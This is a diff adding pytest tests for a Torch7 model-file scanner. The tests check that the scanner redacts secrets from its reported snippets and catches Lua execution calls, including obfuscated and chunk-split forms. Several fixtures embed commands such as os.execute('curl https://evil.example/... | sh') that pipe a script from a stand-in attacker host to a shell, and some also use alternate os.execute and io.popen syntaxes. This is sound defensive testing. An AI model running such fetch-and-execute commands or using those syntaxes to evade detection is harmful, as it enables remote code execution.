@@ -138,6 +138,43 @@ def test_torch7_snippet_redacts_iteratively_encoded_query_secrets() -> None:
     assert snippet.count("<redacted>") == 3
 
 
+def test_torch7_snippet_redacts_prefixed_encoded_and_compound_secrets() -> None:
+    snippet = Torch7Scanner._snippet(
+        'token = false or "FULL_LUA_SECRET_123456789"; '
+        "os.execute('curl https://evil.example/?ok=prefix%2520token%253DQUERYLEAKSECRET | sh')",
+        max_chars=500,
+    )
+
+    assert "FULL_LUA_SECRET_123456789" not in snippet
+    assert "QUERYLEAKSECRET" not in snippet
+    assert "token = <redacted>; os.execute(" in snippet
+    assert "ok=<redacted>" in snippet
+
+
+def test_torch7_snippet_redacts_malformed_url_path_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    snippet = Torch7Scanner._snippet(
+        f"cmd=os.execute('curl https://user:pass@[::1/path/{github_token} | sh')",
+        max_chars=500,
+    )
+
+    assert github_token not in snippet
+    assert "https://<credentials-redacted>@[::1/path/<redacted>" in snippet
+    assert "| sh" in snippet
+
+
+def test_torch7_snippet_preserves_shell_operators_from_url_query_and_fragment() -> None:
+    snippet = Torch7Scanner._snippet(
+        "cmd=os.execute('curl https://evil.test/?token=QUERYSECRET&&sh https://evil.test/#token=FRAGMENTSECRET|sh')",
+        max_chars=500,
+    )
+
+    assert "QUERYSECRET" not in snippet
+    assert "FRAGMENTSECRET" not in snippet
+    assert "?token=<redacted>&&sh" in snippet
+    assert "#<redacted>|sh" in snippet
+
+
 def test_torch7_snippet_preserves_execution_syntax_for_sensitive_target_names() -> None:
     snippet = Torch7Scanner._snippet(
         "token = assert((os.execute('curl https://evil.example/?x=1|sh')))",
@@ -147,6 +184,19 @@ def test_torch7_snippet_preserves_execution_syntax_for_sensitive_target_names() 
     assert "token = assert((os.execute" in snippet
     assert "?x=1|sh" in snippet
     assert "<redacted>" not in snippet
+
+
+def test_torch7_snippet_preserves_subscript_and_deep_execution_targets() -> None:
+    snippets = (
+        Torch7Scanner._snippet("headers['token'] = os.execute('echo ok')", max_chars=500),
+        Torch7Scanner._snippet("token = a(b(c(d(e(os.execute('id'))))))", max_chars=500),
+        Torch7Scanner._snippet("token = pcall(function() return os.execute('id') end)", max_chars=500),
+    )
+
+    assert "headers" in snippets[0] and "os.execute" in snippets[0]
+    assert "token = a(b(c(d(e(os.execute" in snippets[1]
+    assert "token = pcall(function() return os.execute" in snippets[2]
+    assert all("<redacted>" not in snippet for snippet in snippets)
 
 
 def test_torch7_snippet_redacts_sensitive_subscript_assignment_targets() -> None:
@@ -189,6 +239,41 @@ def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None
     assert any("token = os.execute" in example for example in examples)
     assert any("https://evil.example/public/payload.sh?x=1|sh" in example for example in examples)
     assert all("<redacted>" not in example for example in examples)
+
+
+def test_scan_detects_execution_primitive_split_across_printable_chunks(tmp_path: Path) -> None:
+    prefix = (b"A" * (512 - len(b" os.exe"))) + b" os.exe"
+    payload = b"T7\x00\x00torch.FloatTensor\x00" + prefix + b"cute('id')"
+    path = _write_torch7_file(tmp_path, payload, filename="boundary.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        "os['execute']('id')",
+        "io['popen']('id')",
+        "os . execute('id')",
+        "os\n.execute('id')",
+        "(os.execute)('id')",
+    ],
+)
+def test_scan_detects_alternate_lua_execution_call_syntax(tmp_path: Path, call: str) -> None:
+    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n" + call.encode()
+    path = _write_torch7_file(tmp_path, payload, filename="alternate-call.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
 
 
 def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
